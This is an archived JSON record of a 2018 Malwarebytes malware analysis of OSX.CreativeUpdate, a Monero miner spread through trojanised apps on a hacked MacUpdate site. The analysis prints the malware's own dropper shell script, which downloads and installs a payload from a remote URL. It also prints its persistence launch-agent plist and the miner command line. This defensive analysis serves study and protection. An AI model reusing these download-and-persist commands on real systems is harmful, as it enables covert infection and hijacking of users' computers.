{
    "id": "328d9707-385f-4b7f-a00f-1554ca1b115a",
    "created_at": "2023-01-12T14:59:08.913436Z",
    "updated_at": "2025-03-27T02:06:01.806191Z",
    "deleted_at": null,
    "sha1_hash": "0d0e7366a62166ac0d15260c7b9764d81a5284cb",
    "title": "2018-02-02 - New Mac cryptominer distributed via a MacUpdate hack",
    "authors": "",
    "file_creation_date": "2022-05-28T17:59:34Z",
    "file_modification_date": "2022-05-28T17:59:34Z",
    "file_size": 390198,
    "plain_text": "# New Mac cryptominer distributed via a MacUpdate hack\n\n**[blog.malwarebytes.com/threat-analysis/2018/02/new-mac-cryptominer-distributed-via-a-macupdate-hack/](https://blog.malwarebytes.com/threat-analysis/2018/02/new-mac-cryptominer-distributed-via-a-macupdate-hack/)**\n\nThomas Reed February 2, 2018\n\nEarly this morning, security researcher Arnaud Abbati of SentinelOne tweeted about new\nMac malware being distributed via MacUpdate. This malware, which Abbati has named\nOSX.CreativeUpdate, is a new cryptocurrency miner, designed to sit in the background and\nuse your computer’s CPU to mine the Monero currency.\n\n\n-----\n\nThe malware was spread via hack of the MacUpdate site, which was distributing maliciouslymodified copies of the Firefox, OnyX, and Deeper applications. According to a statement\nposted in the comments for each of the affected apps on the MacUpdate website, this\nhappened sometime on February 1.\n\n\n-----\n\nBoth OnyX and Deeper are products made by Titanium Software (titanium-software.fr), but\nthe site was changed maliciously to point to download URLs at titaniumsoftware.org, a\ndomain first registered on January 23, and whose ownership is obscured. The fake Firefox\napp was distributed from download-installer.cdn-mozilla.net. (Notice the domain ends in cdnmozilla.net, which is definitely not the same as mozilla.net. This is a common scammer trick\nto make you think it’s coming from a legitimate site.)\n\nThe downloaded files are .dmg (disk image) files, and they look pretty convincing. In each\ncase, the user is asked to drag the app into the Applications folder, as would the original,\nnon-malicious .dmg files for those apps.\n\n[The applications themselves were, as Abbati indicated in his tweet, created by Platypus, a](https://github.com/sveinbjornt/Platypus)\ndeveloper tool that makes full macOS applications from a variety of scripts, such as shell or\nPython scripts. This means the creation of these applications had a low bar for entry.\n\n\n-----\n\nOnce the application has been installed, when the user opens it, it will download and install\nthe payload from public.adobecc.com (a legitimate site owned by Adobe). Then, it attempts\nto open a copy of the original app (referred to as a decoy app, because it is used to trick the\nuser into thinking nothing’s wrong), which is included inside the malicious app.\n\nHowever, this isn’t always successful. For example, the malicious OnyX app will run on Mac\nOS X 10.7 and up, but the decoy OnyX app requires macOS 10.13. This means that on any\nsystem between 10.7 and 10.12, the malware will run, but the decoy app won’t open to cover\nup the fact that something malicious is going on. In the case of the Deeper app, the hackers\ngot even sloppier, including an OnyX app instead of a Deeper app as the decoy by mistake,\nmaking it fail similarly but for a more laughable reason.\n\nThe “script” file inside the app takes care of opening the decoy app, and then downloading\nand installing the malware.\n\n\n-----\n\n```\nopen Deeper.app\nif [ -f ~/Library/mdworker/mdworker ]; then\nkillall Deeperd\nelse\nnohup curl -o ~/Library/mdworker.zip\n https://public.adobecc.com/files/1U14RSV3MVAHBMEGVS4LZ42AFNYEFF?\n content_disposition=attachment && unzip -o ~/Library/mdworker.zip -d\n ~/Library && mkdir -p ~/Library/LaunchAgents && mv\n ~/Library/mdworker/MacOSupdate.plist ~/Library/LaunchAgents && sleep 300\n && launchctl load -w ~/Library/LaunchAgents/MacOSupdate.plist && rm -rf\n ~/Library/mdworker.zip && killall Deeperd &\nfi\n\n```\nFor those who can’t read shell scripts, this code first attempts to open the decoy Deeper.app,\nwhich will fail since the wrong decoy was included by mistake. Next, if the malware is already\ninstalled, the malicious dropper process is killed, since installation is not necessary.\n\nIf the malware is not installed, it will download the malware and unzip it into the user’s Library\nfolder, which is hidden in macOS by default, so most users wouldn’t even know anything had\nbeen added there. It also installs a malicious launch agent file named MacOSupdate.plist,\nwhich recurrently runs another script.\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\"\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n <key>Label</key>\n <string>MacOSupdate</string>\n <key>ProgramArguments</key>\n <array>\n <string>sh</string>\n <string>-c</string>\n <string>launchctl unload -w ~/Library/LaunchAgents/MacOS.plist && rm\n  -rf ~/Library/LaunchAgents/MacOS.plist && curl -o\n  ~/Library/LaunchAgents/MacOS.plist\n  https://public.adobecc.com/files/1UJET2WD0VPD5SD0CRLX0EH2UIEEFF?\n  content_disposition=attachment && launchctl load -w\n  ~/Library/LaunchAgents/MacOS.plist &&\n  ~/Library/mdworker/mdworker</string>\n </array>\n <key>RunAtLoad</key>\n <true/>\n</dict>\n</plist>\n\n```\nWhen this launch agent runs, it downloads a new MacOS.plist file and installs it. Before\ndoing so, it will remove the previous MacOS.plist file, presumably so it can be updated with\nnew code. The version of this MacOS.plist file that we obtained did the real work.\n```\nsh -c ~/Library/mdworker/sysmdworker -user walker18@protonmail.ch -xmr\n\n```\n\n-----\n\nThis loads a malicious sysmdworker process, passing in a couple arguments, one of which is\nan email address.\n\nThat sysmdworker process will then do the work of mining the Monero cryptocurrency, using\na command-line tool called minergate-cli, and periodically connecting to minergate.com,\npassing in the above email address as the login.\n\nThere are multiple takeaways from this. First and foremost, never download software from\nany kind of “download aggregation” site (a site that acts like an unofficial Mac App Store to\nlet you browse for software). Such sites have a long history of issues. In the case of\nMacUpdate, back in 2015 they were modifying other people’s software, wrapping it in their\nown adware-laden installer. This is no longer happening, but in 2016, MacUpdate was\n[similarly used to distribute the OSX.Eleanor malware.](https://blog.malwarebytes.com/cybercrime/2016/07/new-mac-backdoor-malware-eleanor/)\n\nInstead, always download software directly from the developer’s site or from the Mac App\nStore. These are not guarantees, and can still get you infected with malware, adware, or\nscam software. But your odds are better. Be sure to check around to make sure the software\nis legitimate before downloading, but do not give full credence to ratings or reviews on thirdparty sites or the Mac App Store, as those can be faked.\n\nSecond, if you have downloaded a new application and it seems not to be functioning as\nexpected—such as not opening at all when you double-click it—be suspicious. Consider\n[scanning your computer with security software. Malwarebytes for Mac will detect this](http://www.malwarebytes.com/mac)\nmalware as OSX.CreativeUpdater.\n\nFinally, be aware that the old adage that “Macs don’t get viruses,” which has never been\ntrue, is proven to be increasingly false. This is the third piece of Mac malware so far this\n[year, following OSX.MaMi and](https://objective-see.com/blog/blog_0x26.html) [OSX.CrossRAT. That doesn’t even consider the wide variety](https://digitasecurity.com/blog/2018/01/23/crossrat/)\nof adware and junk software out there. Do not let yourself believe that Macs don’t get\ninfected, as that will make you more vulnerable.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-02-02 - New Mac cryptominer distributed via a MacUpdate hack.pdf"
    ],
    "report_names": [
        "2018-02-02 - New Mac cryptominer distributed via a MacUpdate hack.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535548,
    "ts_updated_at": 1743041161,
    "ts_creation_date": 1653760774,
    "ts_modification_date": 1653760774,
    "files": {
        "pdf": "https://archive.orkl.eu/0d0e7366a62166ac0d15260c7b9764d81a5284cb.pdf",
        "text": "https://archive.orkl.eu/0d0e7366a62166ac0d15260c7b9764d81a5284cb.txt",
        "img": "https://archive.orkl.eu/0d0e7366a62166ac0d15260c7b9764d81a5284cb.jpg"
    }
}